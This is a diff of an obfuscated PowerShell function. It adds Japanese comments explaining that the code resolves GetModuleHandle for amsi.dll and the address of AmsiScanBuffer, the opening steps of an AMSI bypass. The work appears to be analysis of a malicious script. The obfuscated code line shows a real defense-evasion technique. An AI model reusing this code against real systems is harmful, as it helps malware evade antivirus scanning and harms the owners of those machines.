@@ -137,7 +137,8 @@ FUncTIon Get-PZ2zmpurexnDXVSxx {
             $IqnMnVucT+=$_
         }
     }
-#「GetMethods()」メソッドで System.dllの「GetModuleHandle」を取得し、「GetModuleHandle.Invoke($null,amsi.dll)」を実行
+#「GetMethods()」メソッドで System.dllの「GetModuleHandle」を取得し、「GetModuleHandle.Invoke($null,amsi.dll)」を実行しamsi.dllのハンドルを取得
+# System.dllの「GetProcAddress」で、amsi.dllの「AmsiScanBuffer」プロセスのアドレスを取得
     return $IqnMnVucT[0].Invoke($null, @(($IObr8mVbBcalgmD.GetMethod(""+[char]([BYtE] 0x96-0x4f)+[ChaR]([BytE] 0xbb-0x56)+[cHar](5090-4974)+[CHar](7341-7264)+"odul"+[cHaR]([byte] 0xa8-0x43)+[ChAr](1345-1273)+[cHAR](1128-1031)+[cHAr](8032-7922)+"dle")).Invoke($null, @($ljOHgifgLteNDYGV)), $HWN81YY7isiEXwOd))
 
 }
